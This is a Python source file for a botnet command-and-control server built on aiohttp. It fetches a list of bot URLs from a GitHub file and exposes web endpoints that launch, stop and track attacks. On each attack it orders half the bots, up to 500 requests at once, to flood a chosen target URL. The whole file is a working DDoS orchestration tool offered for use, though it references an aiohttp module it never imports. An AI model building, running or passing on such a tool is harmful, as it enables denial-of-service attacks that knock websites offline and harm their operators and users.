import asyncio
import random
import secrets
from aiohttp import web
import httpx

# --- CONFIGURATION ---
GITHUB_BOT_URL = "https://raw.githubusercontent.com/nkarthikraja-32/bot/main/bots.txt"
PORT = 80
MAX_CONCURRENT = 500          # simultaneous outbound requests
BOT_CMD_DURATION = 5          # fixed duration sent to each bot

# --- GLOBAL STATE ---
BOT_ARMY = []                 # all bot URLs
active_attacks = {}           # attack_id -> { 'task': asyncio.Task, 'stop_event': asyncio.Event, 'info': {...} }
attack_counter = 0

def sync_bot_army():
    """Fetch bot list from GitHub."""
    global BOT_ARMY
    try:
        r = httpx.get(GITHUB_BOT_URL, timeout=10)
        r.raise_for_status()
        BOT_ARMY = [line.strip() for line in r.text.splitlines() if line.strip().startswith("http")]
        return len(BOT_ARMY)
    except Exception as e:
        print(f"Bot Army Sync Error: {e}")
        return 0

async def hit_target(session, url, target):
    """Send command to one bot (no proxy)."""
    params = {"url": target, "duration": BOT_CMD_DURATION}
    try:
        async with session.get(url, params=params, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            return resp.status < 400
    except Exception:
        return False

async def attack_coroutine(attack_id, target, stop_event):
    """Background task: select 50% of bots, fire one wave, respect stop_event."""
    if not BOT_ARMY:
        print("ERROR: Bot army empty.")
        active_attacks[attack_id]['info']['status'] = 'error'
        return

    half = max(1, len(BOT_ARMY) // 2)
    selected = random.sample(BOT_ARMY, half)

    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, force_close=True)
    timeout = aiohttp.ClientTimeout(total=8, connect=3)
    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for bot_url in selected:
            async def _task(bot_url=bot_url):
                async with sem:
                    if stop_event.is_set():
                        return False
                    return await hit_target(session, bot_url, target)
            tasks.append(asyncio.ensure_future(_task()))

        # Wait for all, but also watch stop_event
        done, pending = await asyncio.wait(
            tasks, return_when=asyncio.FIRST_COMPLETED
        )
        # If stop requested, cancel remaining tasks
        if stop_event.is_set():
            for t in pending:
                t.cancel()
            active_attacks[attack_id]['info']['status'] = 'stopped'
            return

        # Wait for the rest if not stopped
        results = await asyncio.gather(*tasks, return_exceptions=True)
        successes = sum(1 for r in results if r is True)

    active_attacks[attack_id]['info']['status'] = 'finished'
    print(f"Attack #{attack_id} finished: {successes}/{half} bots hit")

async def launch_attack(request):
    """GET /attack?target=..."""
    global attack_counter
    target = request.query.get('target')
    if not target:
        return web.json_response({"error": "Missing target parameter"}, status=400)

    attack_counter += 1
    aid = attack_counter
    stop_event = asyncio.Event()
    info = {
        'id': aid,
        'target': target,
        'status': 'running'
    }
    task = asyncio.create_task(attack_coroutine(aid, target, stop_event))
    active_attacks[aid] = {'task': task, 'stop_event': stop_event, 'info': info}

    return web.json_response({
        "status": "attack_launched",
        "attack_id": aid,
        "target": target,
        "bots_used": max(1, len(BOT_ARMY)//2),
        "bots_available": len(BOT_ARMY)
    })

async def stop_attack(request):
    """GET /stop?attack_id=..."""
    aid = request.query.get('attack_id')
    if not aid:
        return web.json_response({"error": "Missing attack_id"}, status=400)
    try:
        aid = int(aid)
    except ValueError:
        return web.json_response({"error": "Invalid attack_id"}, status=400)

    if aid not in active_attacks:
        return web.json_response({"error": "Attack not found"}, status=404)

    attack = active_attacks[aid]
    if attack['info']['status'] != 'running':
        return web.json_response({"error": "Attack already finished or stopped"}, status=400)

    attack['stop_event'].set()
    # Optionally cancel the task as well
    attack['task'].cancel()
    return web.json_response({"status": "stop_signal_sent", "attack_id": aid})

async def status(request):
    """GET /status"""
    return web.json_response({"bot_count": len(BOT_ARMY), "active_attacks": len(active_attacks)})

async def sync(request):
    """GET /sync – manually refresh bot list"""
    count = sync_bot_army()
    return web.json_response({"status": "synced", "bot_count": count})

async def cleanup_finished():
    """Periodically remove finished/stopped attacks from memory."""
    while True:
        await asyncio.sleep(30)
        finished = [aid for aid, a in active_attacks.items() if a['info']['status'] != 'running']
        for aid in finished:
            del active_attacks[aid]

def create_app():
    app = web.Application()
    app.router.add_get('/attack', launch_attack)
    app.router.add_get('/stop', stop_attack)
    app.router.add_get('/status', status)
    app.router.add_get('/sync', sync)
    # Add cleanup task on startup
    app.on_startup.append(lambda app: asyncio.create_task(cleanup_finished()))
    return app

if __name__ == '__main__':
    # Initial sync
    count = sync_bot_army()
    print(f"Bot army synced: {count} nodes")
    app = create_app()
    web.run_app(app, host='0.0.0.0', port=PORT)
